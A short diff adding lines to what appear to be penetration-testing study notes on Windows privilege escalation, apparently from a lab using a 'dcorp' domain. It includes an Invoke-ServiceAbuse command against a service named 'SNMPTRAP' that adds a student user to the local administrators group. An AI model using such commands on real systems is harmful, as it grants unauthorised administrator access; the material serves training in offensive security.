@@ -33,3 +33,19 @@ Invoke-PrivEscCheck
 ```
 winPEASx64.exe
 ```
+
+
+### If we find any vulnerable service with modify permission
+
+```
+ Invoke-ServiceAbuse
+```
+
+Can be used
+
+```
+Invoke-ServiceAbuse -Name 'SNMPTRAP' -UserName dcorp\student529
+```
+
+This will add our user to Local admins group
+
